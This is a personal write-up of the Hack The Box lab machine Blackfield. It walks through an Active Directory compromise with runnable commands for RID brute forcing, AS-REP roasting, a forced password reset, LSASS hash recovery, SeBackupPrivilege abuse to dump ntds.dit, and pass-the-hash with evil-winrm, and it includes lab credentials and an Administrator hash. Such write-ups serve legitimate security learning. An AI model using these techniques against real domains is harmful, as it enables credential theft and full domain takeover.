# CTF: Blackfield (HTB)

## Metadata

- **Target IP:** 10.129.229.17
    
- **Domain:** BLACKFIELD.local
    
- **OS:** Windows Server 2019
    
- **Difficulty:** Hard
    
- **Date:** 2026-02-04
    

## Key Skills / Tools

- **Active Directory Enumeration:** RID Brute Force, LDAP/SMB Null Sessions.
    
- **Kerberos Attacks:** AS-REP Roasting (User enumeration/Credential harvesting).
    
- **AD Permissions:** Exploiting `ForceChangePassword` via `net rpc`.
    
- **Post-Exploitation:** LSASS dump analysis, `SeBackupPrivilege` exploitation.
    
- **Tools:** `NetExec`, `impacket-GetNPUsers`, `impacket-secretsdump`, `BloodHound`, `Evil-WinRM`.
    

---

## Reconnaissance

### Port Scanning

A full scan revealed a standard Domain Controller profile. The absence of web ports shifted the focus entirely to **SMB (445)** and **LDAP (389)**.

Bash

```
nmap -p- -Pn $target -v --min-rate 1000 -oN nmap_ports.txt
```

### User Enumeration

Using a guest session, I performed a **RID Brute Force** to identify valid domain users, as standard enumeration was restricted.

Bash

```
netexec smb $target -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print$6}' | cut -d '\' -f2 > users.txt
```

---

## Credential Cracking

### AS-REP Roasting

I checked the enumerated users for the `DONT_REQ_PREAUTH` flag. This allowed me to request a Kerberos ticket for the `support` user without needing their password upfront.

Bash

```
impacket-GetNPUsers BLACKFIELD.local/ -usersfile users.txt -format john -outputfile hashes.txt
```

Cracking the resulting hash with `john` and `rockyou.txt`:

- **User:** `support@BLACKFIELD.local`
    
- **Password:** `#00^BlackKnight`
    

---

## Foothold

### Password Reset (ForceChangePassword)

BloodHound analysis indicated that the `support` account had the specific rights to reset the password for the `audit2020` account.

Bash

```
net rpc password "audit2020" "newP@ssword2022" -U "BLACKFIELD.local/support%#00^BlackKnight" -S DC01
```

### Forensic Share Access

With the new `audit2020` credentials, I accessed the `forensic` SMB share. This contained a legacy memory dump of the LSASS process (`lsass.zip`).

---

## Lateral Movement

### Extracting svc_backup

Analyzing the LSASS dump allowed me to recover the NT hash for the `svc_backup` account.

Bash

```
# Gaining a shell as svc_backup via WinRM using the hash
evil-winrm -i $target -u svc_backup -H <svc_backup_hash>
```

Upon login, I verified my privileges:

PowerShell

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
# Privilege Name                Description                    State
# ============================= ============================== ========
# SeBackupPrivilege             Back up files and directories  Enabled
# SeRestorePrivilege            Restore files and directories Enabled
```

---

## Privilege Escalation

### Dumping the NTDS.dit

**SeBackupPrivilege** allows a user to read any file on the system, bypassing ACLs. I used this to exfiltrate the Active Directory database (`ntds.dit`) and the `SYSTEM` hive.

Once the files were exfiltrated to my attack machine, I used `secretsdump.py` to extract the domain's NTLM hashes:

Bash

```
impacket-secretsdump -system SYSTEM.SAV -ntds ntds.dit LOCAL
```

This yielded the **Administrator** NT hash.

---

## Final Access (Pass-the-Hash)

Instead of cracking the Administrator's complex password, I used the NT hash to authenticate directly via WinRM.

Bash

```
# Using Pass-the-Hash for final Domain Admin access
evil-winrm -i $target -u administrator -H 32196B35FFE96F1667941BBBC5EB3521
```
---

I would love to get to do this machine properly however the box kept failing on me whenever anything ldap was related so I needed to refer back to the walkthrough by Cyber Mage.
